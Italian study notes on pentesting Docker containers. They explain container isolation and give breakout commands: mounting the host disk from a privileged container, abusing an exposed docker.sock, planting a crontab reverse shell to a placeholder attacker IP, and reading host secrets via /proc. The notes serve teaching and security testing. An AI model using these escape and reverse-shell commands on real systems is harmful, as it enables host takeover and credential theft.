# Linux Offensive Security: Docker Breakout
## Il Paradosso del Pentester
Spesso, dopo aver sfruttato una vulnerabilità in una web app o in una pipeline CI/CD, l'attaccante ottiene una **root shell**. Tuttavia, potrebbe trattarsi di un'illusione:
- `whoami` restituisce `root`.
- Si può leggere `/etc/shadow`.
- **Tuttavia**: comandi come `dmesg`, `tcpdump` o il mount di dischi falliscono con "Permission Denied" o "Operation not permitted".

Questo accade perché si è **root all'interno di un container**, ma non sull'host.

### Container Root != Host Root
Sebbene il PID sia 0 nella vista isolata del container, il kernel Linux restringe il processo tramite:
1.  **Namespaces** (isolamento della vista).
2.  **Control Groups** (cgroups - limitazione risorse).
3.  **Dropped Capabilities** (rimozione di privilegi privilegiati del kernel).


---

## Identificazione di un ambiente containerizzato
Per capire se ci si trova in un container, si cercano degli indicatori (**artifacts**):
- Presenza del file `.dockerenv` nella root directory `/`.
- Stringhe "docker" o l'ID del container in `/proc/1/cgroup`.
- **Albero dei processi limitato**: il PID 1 è spesso l'applicazione stessa o una shell, non `systemd` o `init`.
- Interfacce di rete virtuali e MAC address non standard.
- Assenza di "rumore": mancano demoni di background, cronjob o processi utente tipici di un sistema operativo completo.


---

## Architettura: VM vs Containers
A differenza delle Virtual Machines, i container **virtualizzano l'OS** invece dell'hardware.

| Caratteristica | Virtual Machine (VM) | Container |
| :--- | :--- | :--- |
| **Kernel** | Ogni VM ha il suo kernel (Guest OS) | Condividono il **kernel dell'Host** |
| **Isolamento** | Forte (hardware level via Hypervisor) | Logico (OS level via primitive del kernel) |
| **Risorse** | Pesanti (GB di RAM, avvio lento) | Leggeri (MB di RAM, avvio quasi istantaneo) |

## Meccanismi di Isolamento (I tre pilastri)
L'isolamento di Docker poggia su tre feature del kernel Linux:

### 1. Namespaces
Determinano ciò che un processo può **vedere**.
- **PID**: isola i Process ID. Il container ha il suo PID 1.
- **NET**: isola lo stack di rete (interfacce, tabelle di routing, porte).
- **MNT**: isola i mount point (il container ha il suo file system `/`).
- **UTS**: isola hostname e domain name.
- **IPC**: isola le risorse di comunicazione tra processi (memoria condivisa).
- **USER**: mappa i privilegi (es. root nel container = utente non privilegiato sull'host).
- **TIME**: permette offset diversi per l'uptime e il clock di sistema.
- **CGROUP**: isola la vista sulle strutture di gestione risorse.

### 2. Control Groups (cgroups)
Determinano quanto un processo può **consumare** (CPU, RAM, I/O del disco), prevenendo attacchi DoS verso l'host o altri container.

### 3. Capabilities
In Linux, i privilegi di root sono divisi in unità distinte chiamate **capabilities**. Docker, per default, rimuove le più pericolose (es. `CAP_SYS_ADMIN`, `CAP_NET_RAW` per i pacchetti raw).

## Docker Engine e Immagini
- **Daemon (dockerd)**: gira con privilegi di root sull'host e gestisce i container.
- **Docker Image**: template read-only composto da **layer**.
- **UnionFS**: sistema che sovrappone i layer dell'immagine per presentarli come un unico filesystem.
- **Writable Layer**: quando un container parte, viene aggiunto un layer sottile riscrivibile in cima. Se il container viene eliminato, questo layer scompare, mantenendo l'immagine originale intatta.

## Docker Breakout: Tecniche di Evasione
Il breakout è la transizione da una shell containerizzata a una **shell sull'host**. La maggior parte dei breakout deriva da **malconfigurazioni** piuttosto che da exploit del kernel.

### A. Il flag `--privileged`
È l'opzione più pericolosa. Rimuove tutti i layer di isolamento: ripristina le capabilities, disabilita `Seccomp/AppArmor` e garantisce accesso a tutti i dispositivi in `/dev`.

**Sfruttamento:**
```bash
# 1. Vedo i dischi dell'host
fdisk -l 

# 2. Creo un mount point e monto la partizione root dell'host
mkdir /mnt/host_root
mount /dev/sda1 /mnt/host_root

# 3. Uso chroot per "entrare" nel filesystem dell'host
chroot /mnt/host_root /bin/bash
```

### B. Esposizione di `docker.sock`
Il socket di Docker (`/var/run/docker.sock`) è l'entry point per le API. Chi può scrivere su questo socket ha lo stesso potere del demone Docker (root sull'host).

**Sfruttamento:**
Se trovi il socket montato nel container, puoi spawnare un nuovo container che monta l'intero filesystem dell'host:
```bash
# Cerco il socket
find / -name docker.sock 2>/dev/null

# Eseguo un nuovo container (es. alpine) montando la root dell'host in /host
docker run -it --rm -v /:/host/ alpine chroot /host/ bash
```

### C. Sensitive Path Mounts
A volte vengono montate singole directory sensibili dell'host per log o persistenza.
- **Esempio `/etc`**: se `/etc` dell'host è montato, posso piantare una backdoor nel `crontab`.

```bash
# Aggiungo un reverse shell al crontab dell'host
echo "* * * * * root /bin/bash -i >& /dev/tcp/<attackerIP>/4444 0>&1" >> /host_etc/crontab
```
- **Altre idee**: leggere/scrivere chiavi SSH in `/root/.ssh` o modificare `/etc/shadow`.

## Docker Spying (Shared Namespaces)
Anche senza un breakout completo, alcune configurazioni permettono di spiare l'host.
Se viene usato `--pid=host`, il container condivide il namespace dei processi con l'host.

**Possibilità:**
- Vedere tutti i processi dell'host (`ps aux`).
- Leggere variabili d'ambiente sensibili (es. chiavi API, password) in `/proc/<PID>/environ`.
- Accedere ai file descriptor aperti da altri processi in `/proc/<PID>/fd`.

```bash
# Esempio: leggere un file aperto da un processo dell'host
cat /proc/635813/fd/4
```

## Tool Utili per il Pentesting
Esistono strumenti automatizzati per l'enumerazione e l'escape:
- **CDK**: Toolkit per container penetration testing (ottimo per K8s).
- **Deepce**: Script per enumerazione e scalata di privilegi in Docker.
- **Amidcontained**: Tool per capire quali restrizioni (capabilities, seccomp) sono attive.

>[!tip] Metodologia
>Il primo passo in un container è sempre l'**enumerazione delle capabilities** e dei **mount points**. Senza capire cosa è stato "concesso" dal sistemista (per errore o necessità), non è possibile tentare un breakout efficace.
